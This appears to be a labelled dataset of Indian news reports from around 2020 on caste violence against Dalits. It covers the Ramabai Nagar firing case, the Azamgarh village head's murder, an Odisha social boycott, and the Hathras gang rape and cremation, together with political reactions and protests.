Kamble, Mangesh Shivsharan, Bablu Verma, Kausabai Pathare were killed on spot. The Maharashtra state government soon appointed The Gundewar Commission, headed by Justice S.D. Gundewar for conducting a detailed investigation of the incident.  The Gundewar Commission submitted the report in both State Legislative Council and Assembly stating ‘there was no need for the SRPF to begin firing and whosoever instigated the incident should discontinue from the police force.” “The victims who were injured in the incident were blamed as accusers in the sessions court by Manohar Kadam and the inquiry went on for a year”, said Shyam Gaikwad, a senior activist. ‘Hatyakand Virodhi Sangharsh Samiti’ was founded in 1997 by Gaikwad to help the victims of the Ramabai Nagar incident to fight cases and support them with legislative work. “Both Ramabai residents and Manohar Kadam had their magistrates, while the hearing needed to take place in the same court,” said Advocate Rajesh Karamkar. “The residents were booked under three cases falling under section 334, 335 and 336 IPC (voluntarily causing grievous hurt on provocation and negligent act on personal safety to be punished with imprisonment) respectively. No one had an idea about it for nearly seven months until we went to the court,” he added. Previously, convicted under section 304 IPC (culpable homicide with imprisonment) PSI Manohar Kadam was granted bail in the year 2009 when Bombay High Court suspended his life sentence by a vacation bench of Justices Anand Nirgude and Rajesh Ketkar. “Manohar Kadam was never incarcerated in his entire term of imprisonment. The system was challenged because the government was reluctant to prosecute Kadam”, said Advocate Bansode. “Government comes and goes, but the leaders stay”, he added."

1,"INTERACTIVE ELECTION MAPS Deoria: The recent murder of a Dalit pradhan in the Bansgaon area of Azamgarh, Uttar Pradesh, has resulted in a wave of protests across the state, with citizens calling for justice. Activists, including those from Dalit organisations and other social outfits, and opposition parties, held protests in the district and in other places in the state on Sunday against the brutal murder which happened in the Tarwan police station limits. The village head, identified as Satyameva Jayate alias Pappu Ram, was allegedly murdered by four members of the Thakur community. He was taken to a nearby tube well in the village by one of the accused, where he was allegedly shot dead by the upper-caste men, according to his family members. The gruesome incident allegedly took place on Friday night in Bansgaon village, which has close to 300 families with members belonging to Scheduled Castes. It has about 30 families each from the Thakur and Brahmin community. Munni Devi, the wife of the deceased, alleged that a man named Vivek Singh had visited their house in the evening of the murder. “Vivek came to our place and took my husband on a motorcycle to the tube well nearby on the pretext of a feast,” she added. “Later, Vivek Singh, Suryansh Kumar Dubey, Brijendra Singh and Wasim took him to Singh’s pond. Following a heated argument at the meal, Pappu’s friends shot him dead,” she alleged. The accused then informed Pappu’s family about the murder and fled the spot. Following the incident, villagers staged a protest and blocked a road. The protest eventually turned violent. An 18-year-old boy died during the demonstrations after allegedly coming under a police vehicle. The police have lodged a case against the four accused mentioned in the FIR. Azamargarh Deputy Inspector General of Police Subhash Chandra Dubey said that the police were going by the family’s claims “till the accused are arrested and questioned. It doesn’t matter what the motive is,” he added. “The murder of an elected person is a very serious crime,” he said. ""All the people involved in the murder of the village head will be booked under the National Security Act (NSA) and the Gangster Act. A reward of Rs 25,000 was announced by the state government,"" the officer said. Lincoln, the nephew of Pappu Ram, claimed that there were a series of heated arguments between his uncle and upper-caste people in the village ever since he assumed the post of pradhan. “My uncle was the first person from our community to have become the pradhan of this village, and upper caste people could not digest his win. They were jealous of his stature and the fact that he walked around with his head held high,” he told NewsClick. “They murdered my uncle because Dalits raise their voice against any atrocity committed by upper-caste. We did not bow our heads before them, neither did the pradhan. They could not stand a Dalit man saying no to them,"" alleged Lincoln, adding that the accused would resort to casteist slurs against his uncle, Pappu Ram. Lincoln categorically blamed Suryansh Kumar Dubey, who, he said, had been trying to force his uncle to give him a letter confirming that he resided in the village. Dubey has five other cases pending against him, including one relating where he was charged with attempting to murder a person. According to National Crime Records Bureau (NCRB) data from 2018, in crimes against Dalits – ranging from rape, murder, violence and land-related issues – Uttar Pradesh topped the list, followed by another Bharatiya Janata Party-ruled state, Gujarat. The National Campaign on Dalit Human Rights (NCDHR), which has intervened in more than 80 such cases, stressed on the need to draw the attention of enforcement authorities and the judiciary on matters of discrimination and atrocities against Dalits, especially women and children. “Dalits have been discriminated against through social boycott and physical assault. Untouchability and physical abuse have been rampant during the pandemic. It is important to highlight that Dalit lives matter in the country,” said Dalit rights activist Paul Divakar. Speaking to NewsClick, Satish Prakash, a Dalit thinker and an associate professor of physics at Meerut University, said the state government needs to clamp down on rising atrocities against Dalits amid the COVID-19 pandemic. “Uttar Pradesh police have the political patronage of the state government and criminals. They roam freely after committing crimes in the knowledge that the police won't take any action against them. This is a key reason why cases against Dalits are increasing – ranging from rape, murder, violence and land-related issues,"" the Dalit activist said."
1,"After a Dalit girl plucked a flower from the garden of an upper caste resident in an Odisha village, the entire community has been boycotted. Caste hierarchies and deeply entrenched inequalities in the domain of Indian society depict the most disturbing truth wherein despite over seven decades of independence, we continue to nurture a social fabric that discriminates and exploits people on the basis of their caste affiliations. This truth became even more apparent when forty Dalit families in the Kantio Kateni village of Odisha were asked to leave and village and go after they were subjected to more than two weeks of boycott after a Dalit girl from the community was caught plucking flowers from the garden of an upper caste family. For having plucked flowers from the garden of an upper caste family not only the little girl and her family, but more than 40 households of the Dalits were humiliated and assaulted for over two weeks and they were also asked to leave the village. This led to a sustained conflict between the upper and lower castes in the village and as a result the upper castes boycotted over 40 Dalit families. The girl who had allegedly picked up flowers from the garden of an upper caste resident of the village is reported to have immediately apologised so that they matter could be resolved on the spot but after a series of meetings, it was decided that all the Dalit families living in the village will be boycotted and it was also decided that they would no longer be allowed to participate in any social event of the village. The village has a total of 800 families and 40 households belonging to the SC Naik community. As part of the social boycott that is being sustained against these 40 families, milk and grocery stores in the village have stopped selling their items to them and everybody outside the caste fold has stopped talking to them. The upper castes have also ensured that the lower castes are not given any work in the village and are compelled to move out of the village in search of work. They have also been warned against taking out processions related to funerals and marriages and their children have been denied the right to study in the government school in the premises of the village. The police have said that even if after the conduction of several meetings between the elders of both the communities matters are not resolved, they will be completed to register an FIR.

1,"Bengaluru: In what appears to be the first reaction from a senior Congress leader, Karnataka Pradesh Congress Committee (KPCC) president DK Shivakumar on Saturday thanked God that party MLA Akhanda Srinivas Murthy escaped unscathed in the recent violence in Bengaluru. “Nothing happened to his life, that is important,” Shivakumar told news agency IANS, thanking God for ensuring his safety. Shivakumar said that the Congress stands by Murthy and couldn’t react to the situation as it was trying to find out more information about the riots and why they took place. When questioned if the any sort of material help was being extended to Murthy, Shivakumar said that it’s “a very small issue”. “Material help and all is a small issue. He is okay, he is being taken care of,” he said. He said that a 5-member team visited Murthy on Sunday. Meanwhile, the Dalit MLA is clueless as to why the violent mob attacked him and wondered what he had done for such a treatment. “What have I done? What rowdyism have I done?” he asked. Murthy said that the SC/ST Atrocity Act was not invoked by the state government, and hoped that the police will investigate all angles into the incident. Hundreds of people ran amok on Tuesday night after the Pulikeshi Nagar’s Congress MLA’s nephew P Naveen posted a purportedly derogatory message on social media.

1,"The 19-year-old victim was gang raped by four men in Uttar Pradesh’s Hathras town, about 100km from New Delhi. A woman died in hospital in the Indian capital, New Delhi, on Tuesday, weeks after authorities said she was raped by a group of men, triggering protests and opposition criticism over what it said was a failure to protect women. Her case was the latest in a string of gruesome crimes against women in India that have given it the dismal reputation of being one of the worst places in the world to be female. One woman reported a rape every 15 minutes on average in India in 2018, according to the latest government data released in January. “There is next to no protection for women. Criminals are openly committing crimes,” Priyanka Gandhi Vadra, a leader of the opposition Congress party, said on Twitter. The 19-year-old victim, belonging to the Dalit community – formerly known as “untouchables” – was attacked and raped on September 14 at a field near her home in Hathras district, 100km (62-mile) from New Delhi, authorities said. Police have arrested four men in connection with the crime. Yet another gang-rape of a Dalit Girl in UP's Hathras.

About 300 protesters from the Bhim Army, a party championing the rights of Dalits, entered the hospital building and shouted slogans near the mortuary where the woman’s body was kept. “We will take the matter to fast-track court for the faster investigation and collection of evidence,” district authorities in Hathras said in a statement. #Hathras trended on Twitter as social media users expressed outrage at the latest case of gruesome sexual assault. The woman’s home state of Uttar Pradesh, which is governed by Prime Minister Narendra Modi’s Bharatiya Janata Party (BJP), ranks as the most unsafe state for women in the country. Last December, a 23-year-old Dalit woman was set ablaze by a gang of men as she made her way to a court in Uttar Pradesh to press rape charges. A man from Uttar Pradesh arrested after he allegedly slashed his wife’s stomach with a sickle to check gender of baby.

1,"The woman had been admitted to the ICU in Delhi with multiple fractures and her tongue cut off. A 19-year-old Dalit woman, who had been allegedly gang-raped by four so-called upper caste men in Uttar Pradesh's Hathras, died in a hospital in Delhi, news agency ANI reported on Tuesday, 29 September, quoting her brother. The woman had been admitted to the intensive care unit (ICU) in a Delhi hospital, with multiple fractures and her tongue cut off, NDTV reported. The victim had managed to give her statement to the police, stating that she was raped by four men on 14 September when she had gone to collect fodder for animals. The four accused had been arrested and sent to custody. Before being taken to Delhi, the victim had been admitted to an ICU in the Aligarh Medical College. Initially, her family had reportedly accused the police of not taking action. National Commission for Women (NCW) chairperson, Rekha Sharma, told reporters that suo moto cognizance was taken when the incident came to the fore. Sharma said that “unfortunately, the victim passed away. We will be there to help her family. To control such incidents we need to change the mindset of the society,” ANI reported. The DM has rubbished the reports of the victims’ tongue being chopped off as false, ANI reported. State Minister Siddharth Nath Singh expressed remorse, saying that “the government stands with the victim's family.” “The investigation started immediately and four accused have been arrested. Strict action will be taken. Law will take its own course,” he added. Speaking to The Quint, Asha Devi, mother of the 2012 Delhi gang-rape victim, said that such brutal incidents of rape has become an “everyday affair” in India, but the elected representatives do not want to discuss it. “News channels will show these things for the next two days and politicians will give some token comments. But what after that? Are these incidents going to stop? Has punishment for such crimes been made stricter? No. How long will women in India fight for safety,” she questioned. Congress leader Priyanka Gandhi slammed the Uttar Pradesh government for the deteriorating law and order situation in the state, and demanded “strictest punishment” for the perpetrators of the crime. BSP chief Mayawati, too, tweeted condolences, adding that her party will help the victim’s family get justice. (At The Quint, we are answerable only to our audience.

1,"A 19-year-old Dalit woman from Uttar Pradesh succumbed to injuries at a hospital in New Delhi after she was allegedly gangraped by four upper caste men in Hathras district on September 14. Security has been beefed up outside the Safdarjung Hospital where the Congress and Bhim Army activists are staging a protest over the gang-rape of the woman. Meanwhile, members of the Delhi Mahila Congress also staged a protest at Vijay Chowk demanding justice for the victim. Congress Rajya Sabha member P L Punia and former MP Udit Raj also joined the protest which was led by Delhi Mahila Congress president Amrita Dhawan. The victim was initially admitted to a district hospital 15 days ago with her tongue cut off and spinal cord severely injured, among other serious injuries. She was later shifted to Aligarh hospital for treatment, before moving to Safdarjung Hospital in the national capital. The police said the victim had been dragged into a field and gangraped. She had also been strangled with her dupatta. Four upper caste men of the woman’s village in Hathras district, who were charged with gangrape and attempt to murder, apart from charges under the SC/ST (Prevention of Atrocities) Act, have been arrested. They were arrested based on a statement provided by the victim on September 23, when she briefly regained consciousness. She had accused three men – Sandeep, his uncle Ravi (35) and their friend Luv Kush, of committing the crime. The victim’s mother, who had gone with her to a field nearby to cut grass for their cows before the incident took place, had told The Indian Express, “I was sitting 100 metres from her. I could have saved her. I wish I wasn’t hard of hearing.” The family alleged the main accused, Sandeep, and his family had “always harassed Dalits in their area”. Nearly two decades ago, Sandeep’s grandfather had been booked under the SC/ST Act and served three months in prison for allegedly thrashing the victim’s grandfather over a petty issue. ‘Inhumane, beyond cruelty’: Virat Kohli demands justice for Hathras gangrape victim The victim’s brother said the incident of 19 years ago had left rancour between the families, “but nothing ever happened”. “They are upper castes and have always called us names. We ignore them. Sandeep is an alcoholic who harasses women, but nobody ever files a complaint,” he said. Meanwhile, the Hathras District Magistrate, Praveen Kumar said Tuesday the family would be provided Rs 10 lakh as aid. The National Commission for Women (NCW) assured all possible assistance to the victim’s family. NCW Chairperson Rekha Sharma said, “An NCW member is going to meet the brother of the victim and we will help the family in whatever way we can.” Hitting out at the BJP, the Congress questioned the “silence” of Prime Minister Narendra Modi and women leaders of his party, and alleged Uttar Pradesh under the Yogi Adityanath government has become the “crime capital” of the country. Reacting to the death of the woman, Congress general secretary Priyanka Gandhi Vadra targeted the state government for the deterioration of law and order. “Law and order in Uttar Pradesh has deteriorated to a great extent. There is no semblance of safety for women. The criminals are committing crimes in the open,” she said. Tagging Chief Minister Yogi Adityanath, she added, “You are responsible for the safety of women.” She demanded the accused be punished severely. Delhi Chief Minister Arvind Kejriwal called the incident “shameful” for the country. “The death of the Hathras victim is shameful for the entire society, the country, and for all governments. It is sad that so many daughters are being sexually assaulted and we have not been able to protect them. The guilty must be hanged at the earliest,” he said. Condoling the death of the victim, Samajwadi Party chief Akhilesh Yadav said “no hope” is left from the “insensitive government”. “A dalit daughter, who was victim of gangrape and brutality ultimately died. I condole her death. No hope is left with present insensitive government,” Yadav said in a tweet in Hindi. 📣 The Indian Express is now on Telegram.

The gang rape and killing of the woman from the lowest rung of India's caste system has sparked outrage across the country with several politicians and activists demanding justice and protesters rallying on the streets. (AP Photo/Altaf Qadri) NEW DELHI -- The gang rape and death of a woman from the lowest rung of India's caste system sparked outrage across the country on Wednesday, with several politicians and activists demanding justice and protesters rallying in the streets. The attack of the 19-year-old is the latest gruesome case of sexual violence against women to rile India, where reports of rape are hauntingly familiar. The victim, who belonged to the Dalit community, was raped by four men on Sept. 14 in the heartland state of Uttar Pradesh's Hathras district. The woman's family told local media that they found her naked, bleeding and paralyzed with a split tongue and a broken spine in a field outside their home. She died two weeks later, on Tuesday, after battling serious injuries in a hospital in New Delhi. Police said the four men, all from an upper caste, have been arrested. Uttar Pradesh's chief minister, Yogi Adityanath, on Wednesday ordered a special investigation team to handle the case and said it will be tried in a fast-track court. In New Delhi, police detained several female activists after they tried to march in the street shouting slogans against Adityanath and Prime Minister Narendra Modi. The demonstrators carried placards that read, “Stop rape culture.” Maimoona Mullah of the All India Democratic Women's Association said Uttar Pradesh, which is ruled by Modi's Bharatiya Janata Party and ranks as the most unsafe state for women in the country, had become the “rape state of India.” “We do not accept rape culture in the name of new India,” Mullah said. Earlier on Tuesday, hundreds of protesters from the Bhim Army, a party championing the rights of Dalits, thronged the hospital premises in New Delhi and jostled with police. Party leader Chandra Shekhar Aazad urged Dalits across the country to flood the streets to demand that the perpetrators be hanged. Dalits - formerly known as “untouchables” and at the bottom of India's unforgiving Hindu caste hierarchy - are victims of thousands of attacks each year. According to human rights organizations, Dalit women are particularly vulnerable to caste-based discrimination and sexual violence. Last month, a 13-year-old Dalit girl was raped and killed in Uttar Pradesh. In December last year, a 23-year-old Dalit woman in the same state died after being set ablaze by a gang of men as she made her way to court to press rape charges. Both cases are pending in court. In the latest case, questions were raised over a hasty cremation, with several politicians calling it an abuse of human rights. The woman was cremated early Wednesday, with the family alleging that police did not allow them to perform her final rites. Videos on social media show the family weeping as police insisted on cremating the body without allowing them to take it home. Senior Police Officer Vikrant Veer denied the allegations, while the leader of the opposition Congress party, Rahul Gandhi, described the cremation incident as “abusive and unjust.” In India, rape and sexual violence have been under the spotlight since the 2012 gang rape and killing of a 23-year-old student on a New Delhi bus. The attack galvanized massive protests and inspired lawmakers to order the creation of fast-track courts dedicated to rape cases and stiffen penalties for those convicted of the crime. In March, four men sentenced to death for the 2012 attack were hanged. Indians often rally for swift justice in a country where a woman is raped every 15 minutes, according to government data, and sentencing is notoriously delayed by backlogged courts. According to the government, police registered 33,658 cases of rape in 2017 - an average of 92 per day and a 35% jump from 2012. About 10,000 of the reported victims were children. The real figure is believed to be far higher due to the stigma of sexual violence. Associated Press video journalist Shonal Ganguly contributed to this report.

Don't miss out on the latest News Bijay Kumar Minj, New Delhi Updated: September 08, 2020 03:43 AM GMT Dalit Christians, activists and civil society protest in New Delhi on Dec. 4, 2018, demanding that the Indian government give them the same rights as enjoyed by their Hindu counterparts. (Photo: Bijay Kumar Minj/UCA News)  Dalit Catholic leaders across India have threatened to start a new church if their demand to end casteism and discrimination against Dalits in the Catholic Church is not met. Around 30 speakers and 150 participants attended a virtual meeting on Sept. 5 organized by six Dalit Christian organizations from the southern state of Tamil Nadu. “If the Vatican does not immediately remove the discriminatory process of bishop selection that neglects qualified Dalit priests, we could announce our own Indian Dalit Catholic Church or the Indian Dalit Catholic Rite,” Franklin Caesar Thomas, coordinator of the National Council of Dalit Christians (NCDC), told UCA News. “The new church will separate Dalit Catholic Christians from the Indian Catholic Church's casteist leadership.” During the virtual meeting, Dalit leaders appealed to the Catholic Church, the apostolic nuncio to India and Pope Francis to curb the visible and invisible untouchability practices that exist in the selection of bishops. They said that none of India’s four cardinals and 31 archbishops have a Dalit background. Similarly, among 188 bishops, only 11 are from the Dalit community. In caste-ridden Tamil Nadu, only one of 18 bishops is from a Dalit background. Dalits, formerly untouchables, are the lowest caste within Hindu society. Huge numbers of Dalits have converted to Christianity and Islam over the decades, though the religions offer limited protection from societal prejudice. The word Dalit means ""trampled upon"" in Sanskrit and refers to all groups once considered untouchable and outside the four-tier Hindu caste system. Government data shows 201 million of India’s 1.2 billion people belong to this socially deprived group. Some 60 percent of India's 25 million Christians are of Dalit or tribal origin. Vincent Manoharan, national convener of National Dalit Christian Watch (NDCW), told UCA News that years of protests by the Dalit Christian community had not brought any positive changes. He said protest marches are planned near the nuncio’s office and the headquarters of the Catholic Bishops’ Conference of India (CBCI). “Dalit Christians are fighting for their respective place in the Church as well as fighting in the Supreme Court for their scheduled caste status in society,” Manoharan said. “From now onwards we will have national and international conventions to press our demand to end casteism and discrimination against Dalits in the Catholic Church. Unfortunately, our brethren are suffering in both the Church and society. “We are also planning to send our representative to the Vatican, United Nations and the European Union so that we can build a pressure group at international level.” Can't read the image? click here to refresh.

1,"Posted on 26 September 2020 by Admin_markaz JIH V-P Prof. Salim Engineer  New Delhi, 26 Sept. 2020: Jamaat-e-Islami Hind (JIH) has condemned the reported gang rape of a 19-year-old Dalit girl from a village in Hathras district of Uttar Pradesh. In a statement issued to the media today, JIH Vice President – Prof Salim Engineer said: “Jamaat-e-Islami Hind condemns the alleged gang rape of a Dalit girl in Boolgarhi village, Hathras district, UP. It is reported that she is in the ICU at a hospital in Aligarh and on a ventilator, fighting for her life. Her tongue was cut off; the spinal cord severely injured and has several injuries on her neck. Four upper caste men have been charged with gang rape and attempt to murder along with the SC/ST (Prevention of Atrocities) Act. The police have managed to arrest three of the accused. Reports suggest that the village has around 600-odd families of which only 15 families belong to the Dalit community. The Dalits always faced harassment and intimidation at the hands of the upper-caste villagers who make up around 400 families.” Prof Salim Engineer averred: “We demand expeditious inquiry and trial of the case and expect the UP government to ensure that swift justice is delivered to the victim. Cases of rape and sexual harassment are on the rise in the state of Uttar Pradesh. Recently there have been cases of rape of minors in Maharajganj, Lakhimpur Kheri, Meerut and Greater Noida. The administration must take cognizance of this spike in sexual crimes by sprucing its law and order machinery. Crimes increase in places where criminals feel emboldened by weak law enforcement and feel that they can ‘manage’ the ‘system’ and go unpunished. The question of Dalit atrocities is a long unresolved problem in India and requires both society and the state to contribute in solving it. They remain barred from entry into places of worship, denied access to water facilities, and seating among other upper-caste villagers On the one hand, the state has to ensure that there will be zero-tolerance for any hate crime and Dalit atrocity and no violation of dignity will go unpunished. Moreover, social activists, religious leaders and political parties must take up the project of social engineering and motivate people to adhere to the principle of equality, universal brotherhood and human fraternity. The dream of economic prosperity despite gross income inequality and social injustice is a disillusionment that we can ill afford to harbor.” Comments are closed. 8 September 2021 0 comment 8 September 2021 0 comment 7 September 2021 0 comment 6 September 2021 0 comment 5 September 2021 0 comment 2 September 2021 0 comment 31 August 2021 0 comment 28 August 2021 0 comment    08 Sep 2021 | 0 comment 08 Sep 2021 | 0 comment 07 Sep 2021 | 0 comment 06 Sep 2021 | 0 comment 05 Sep 2021 | 0 comment 02 Sep 2021 | 0 comment 28 Aug 2021 | 0 comment 19 Aug 2021 | 0 comment 17 Aug 2021 | 0 comment 14 Aug 2021 | 0 comment 08 Sep 2021 | 0 comment 08 Sep 2021 | 0 comment 06 Sep 2021 | 0 comment 05 Sep 2021 | 0 comment 26 Aug 2021 | 0 comment 05 Jun 2021 | 0 comment 29 Aug 2020 | 0 comment 31 Oct 2019 | 0 comment 27 Jun 2019 | 0 comment 08 Apr 2019 | 0 comment VISIT OTHER USEFUL WEBSITES Copyright © 2018 Jamaat-e-Islami Hind.

1,"The brutal gang-rape of a Dalit woman in Uttar Pradesh’s Hathras and her subsequent death has triggered a huge outcry across India. Angry citizens have sought to highlight the hypocrisy of Union Minister Smriti Irani and India’s lapdog media.  The 19-year-old Dalit woman was brutally raped by four men on 14 September. The girl’s perpetrators cut her tongue and broke three of her bones. She succumbed to her injuries on Tuesday at a hospital in Delhi. According to media reports, the girl was attacked by a group of monsters when she was working in a field with her mother. She was first admitted to a local hospital in Aligarh but had to be rushed to Delhi’s Safdarjung Hospital when her condition deteriorated. The Hathras Police, whose questionable role came under scrutiny, on Tuesday issued a statement denying the reports that the victim’s tongue was slashed by her perpetrators. ‼️खण्डन/Denial‼️ ➡️ कतिपय सोशल मीडिया के माध्यम से यह असत्य खबर सार्वजनिक रुप से फैलायी जा रही है कि “थाना चन्दपा क्षेत्रान्तर्गत दुर्भाग्यपूर्ण घटित घटना में मृतिका की जीभ काटी गयी, आँख फोडी गयी तथा रीढ की हड्डी तोड दी गयी थी हाथरस पुलिस इस असत्य एवं भ्रामक खबर का खंडन करती है pic.twitter.com/tyBTi1xZhp — HATHRAS POLICE (@hathraspolice) September 29, 2020  Meanwhile, Twitterati have targeted the hypocrisy of India’s lapdog media for losing their voice on the gruesome gang-rape and death of the Dalit girl. Netizens are also condemning Union Minister Smriti Irani for her silence on the humanity-shaming incident. Many took to Twitter reminding Irani how she had taken to the streets protesting against the crimes against women during the UPA government headed by the then Prime Minister Manmohan Singh. Ironically, Irani now holds the Women and Child Development ministry in the central government headed by Prime Minister Narendra Modi and is also an MP from Uttar Pradesh, where the 19-year-old Dalit girl was brutalised. 2012 October – Smriti Irani held a protest against the growing rapes under the UPA govt. 2020 – Smriti Irani is the Women and Child Development minister and an MP from UP (Amethi) I leave it here. #HathrasCase pic.twitter.com/VwCjPjwpIy — Samia Kapoor (@iSamiakapoor) September 29, 2020  Can someone please inform antaxari farosh @smritiirani about brutal gang rape of Hathras girl .. the girl succumbed to injuries.

1,"INTERACTIVE ELECTION MAPS Image Courtesy: The Financial Express New Delhi: The 19-year-old dalit girl, who was brutally gang-raped, allegedly by four upper caste men in Uttar Pradesh’s Hathras, succumbed to her injuries in Delhi’s Safdarjung Hospital, according a senior police officer in Hathras. The family of the girl said she died around 3 a.m on Tuesday, Superintendent of Police, Hathras, Vikrant Vir, said, as per a PTI report. The grievously injured girl had been shifted to a hospital in Delhi from Aligarh on Monday after her condition showed no signs of improvement. The girl was gang-raped on September 14 following which she was admitted to the Aligarh Muslim University's Jawaharlal Nehru Medical College and Hospital. According to Indian Express, the victim was admitted to a district hospital 15 days ago “with her tongue cut off and spinal cord severely injured, among other serious injuries”. According to the police, the girl had been dragged into a field and gang-raped and had also been strangled with her dupatta. “Four upper caste men of the woman’s village in Hathras district, who were charged with gang’rape and attempt to murder, apart from charges under the SC/ST (Prevention of Atrocities) Act, have been arrested,” the police said. The four upper caste men were arrested based on a statement provided by the victim on September 23, when she briefly regained consciousness. She had accused three men – Sandeep, his uncle Ravi (35) and their friend Luv Kush, of committing the crime, the IE report said. Meanwhile, anger and tension was palpable in the vicinity of the girl’s home in Chandapa village with the administration deploying the Provincial Armed Constabulary there, according to a report in Hindustan Times. Slamming the Yogi Adityanath government for the deteriorating law and order situation and the rising insecurity of women, Congress general secretary Priyanka Gandhi said:,""@myogiadityanath you are responsible for the security of women in Uttar Pradesh,"" as king for “strict” punishment for the culprits. ...यूपी में कानून व्यवस्था हद से ज्यादा बिगड़ चुकी है। महिलाओं की सुरक्षा का नाम-ओ-निशान नहीं है।अपराधी खुले आम अपराध कर रहे हैं। इस बच्ची के क़ातिलों को कड़ी से कड़ी सजा मिलनी चाहिए। @myogiadityanath उप्र की महिलाओं की सुरक्षा के प्रति आप जवाबदेह हैं। 2/2 — Priyanka Gandhi Vadra (@priyankagandhi) September 29, 2020 On Sunday, Bhim Army chief Chandrashekhar Azad dodged the police and reached the village. He demanded Rs 1 crore compensation for the family. Bahujan Samaj party supremo Mayawati also targeted the Yogi Adityanath government for the incident and demanded a fast-track court to handle the case. Bhim Army chief Chandrashekhar Azad and his supporters held a protest on Tuesday at Delhi's Safdarjung Hospital, PTI reported. At the protest, the Bhim Army chief said, ""I appeal to all members of the Dalit community to take to the streets and demand death penalty for the guilty. The government should not test our patience. We won't rest until the culprits are hanged."" ""The state government is equally responsible for the death of our sister,"" Azad alleged."
1,"Everything is Written Here The Dalit woman died in Safdarjung Hospital in the capital, New Delhi, on Tuesday, weeks after she was gang-raped by four upper-caste Hindu men in Uttar Pradesh’s Hathras town. The woman was left with her legs paralysed fully and hands partially after the assault on September 14. Outside the Safdarjung Hospital, the Congress and Bhim Army activists staged a protest over the incident. The victim’s father and cousin also joined the dharna outside the Hospital. The opposition parties Congress, SP, BSP, and Bhim Army hit out at the Yogi Adityanath government and demanded the UP Chief Minister’s resignation. The four accused, Sandeep, Ramu, Lavkush, and Ravi who have already been arrested will now also face charges under Section 302 (murder) of the IPC, according to the Hathras SP. Bhim Army While Bhim Army staged a protest outside the hospital demanding the death penalty for the four arrested accused, the party said its chief Chandrashekhar Azad has been arrested and taken to an undisclosed location by the police.

At the protest, the Bhim Army chief said, “I appeal to all members of the Dalit community to take to the streets and demand death penalty for the guilty. The government should not test our patience. We won’t rest until the culprits are hanged.” Congress Former Congress president Rahul Gandhi said that “class-specific jungle raj” in Uttar Pradesh had killed another young woman. “The government said that this is fake news and left the victim to die. Neither was this unfortunate incident fake nor was the death of the victim and the mercilessness of the government,” Rahul Gandhi tweeted in Hindi. Party general secretary in-charge of Uttar Pradesh Priyanka Gandhi Vadra led the charge against the UP government over the incident, alleging that there was “no semblance of security” for women in the state. “A Dalit girl who was victim of demoniac behaviour in Hathras has passed away at Safdarjung Hospital. For two weeks, she struggled between life and death in hospitals,” she tweeted in Hindi. “You are accountable for the safety of women in UP,” Priyanka Gandhi said, referring to chief minister Adityanath. सफदरजंग अस्पताल में मनीषा बाल्मीकि ने अंतिम सांस ली। चोट और यौन हमले की स्थिति निर्भया जैसी थी ।बेटी मनीषा एक दलित थीं इस वजह से मीडिया कवरेज और विरोध प्रदर्शन बड़े स्तर पर नही हुआ , मैंने जैसे ही विरोध किया पुलिस ने तुरंत गिरफ्तार कर लिया #Hathras pic.twitter.com/q8v73OTaej काश ! पीङिता हिंदू होती । pic.twitter.com/UnKTRSohW3 Congress Rajya Sabha member P L Punia and former MP Udit Raj joined the protest led by Delhi Mahila Congress president Amrita Dhawan. Thousands of Congress activists took to the street across various cities in Uttar Pradesh against the incident. BSP In a tweet in Hindi, Mayawati said, “The news of the death of Dalit victim after gangrape in Hathras, UP is very saddening. The government should provide all possible help to the victim’s family and ensure fast punishment to the culprits by prosecuting them in a fast track court. This is the demand of the BSP.” यूपी के हाथरस में गैंगरेप के बाद दलित पीड़िता की आज हुई मौत की खबर अति-दुःखद। सरकार पीड़ित परिवार की हर संभव सहायता करे व फास्ट ट्रैक कोर्ट में मुकदमा चलाकर अपराधियों को जल्द सजा सुनिश्चित करे, बीएसपी की यह माँग। SP Samajwadi Party supremo Akhilesh Yadav on Tuesday condoled the death of the Hathras gangrape victim, and said “no hope” is left from the “insensitive government”. “A dalit daughter, who was victim of gangrape and brutality ultimately died. I condole her death. No hope is left with present insensitive government,” Yadav said in a tweet in Hindi."
1,"*Trigger Warning: Sexual Assault* After all the social media reports describing the inhumaneness committed against the alleged Hathras gang-rape victim, UP CM Yogi Adityanath has directed the trial of the case in a fast track court and the SIT has been formed. The victim died on Tuesday in Delhi’s Safdarjung Hospital, two weeks being allegedly gang-raped and tortured in Uttar Pradesh’s Hathras area. She underwent numerous fractures and paralysis, her tongue was horrifyingly cut off, along with several assaults. Long after her death, her family had to suffer a night of interminable horror. A very distressing series of events was caught in overnight pictures, where the victim was allegedly cremated by policemen and her family and relatives were locked-up in their homes. The visuals showed that the victim’s family was arguing with cops and female relatives were throwing themselves on the ambulance that was carrying the body. The mother was helplessly weeping as cops insisted on taking her daughter straight for cremation, without even allowing them a last look. Soon after that, many protesters chanted “hang the rapists“, outside the Delhi hospital and the victim’s brothers complained that her body had been taken away by the UP police. Even the victim’s father and brothers protested but they were allegedly taken away by the UP cops in a black Scorpio with UP plates. The victim’s father said, “We wanted the last rites to be performed according to the Hindu traditions. Despite our protests, the cremation was performed. They took the body forcefully. We couldn’t see our daughter’s face for the last time.” He also pleaded with the police to be permitted to take her home and cremate her in the morning but they didn’t allow this. After midnight, the victim’s body was taken to her village in Hathras. Reportedly, many appeals were also made to the District Magistrate Praveen Kumar Laxkar, to take her body home for last rights, after daybreak. At around 2:30 AM, while most of her family was home, the police cremated the body. All the four alleged attackers who are reportedly ‘upper caste’ men from the victim’s village are in jail and will also be charged with murder. The UP police are under inspection over alleged breaks throughout the case. It was initially registered as an attempted murder case; later, they added the rape charges, only after the victim’s formal proclamation. After the death of the victim, IPC section 302 (punishment for murder) has also been invoked, said that police, furthering that under the SC/ST Act, the victim’s family has been given monetary compensation of Rs 10 lakh. However, in a press conference, IG Piyush Mordiya said that the medical examination of the victim did not confirm rape. He also added that the details have been sent to the forensic science lab in Agra for more examination and the results are expected any time soon confirmed the IG. On September 14th 2020, the victim went to the field to gather fodder. Then a group of men attacked her from behind, and she was allegedly dragged by a dupatta around her neck that caused the spinal injuries, to a field where she was allegedly raped. The station house officer (SHO) of Chandpa police station in Uttar Pradesh’s Hathras district, under whose jurisdiction the Dalit woman was allegedly gang-raped, has been transferred to the district police lines for his “failure to promptly act”. Delhi chief minister Arvind Kejriwal tweeted and demanded that the guilty be tried and hanged at the earliest. “The death of Hathras victim is shameful for the entire society, country as well as for all the governments. It is highly sad that so many daughters are being sexually assaulted and we have not been able to protect them.” Congress general secretary Priyanka Gandhi said on Twitter, “A Dalit girl who was a victim of demoniac behaviour in Hathras has passed away at Safdarjung Hospital. For two weeks, she kept struggling between life and death in hospitals.” The hashtagNirbhaya 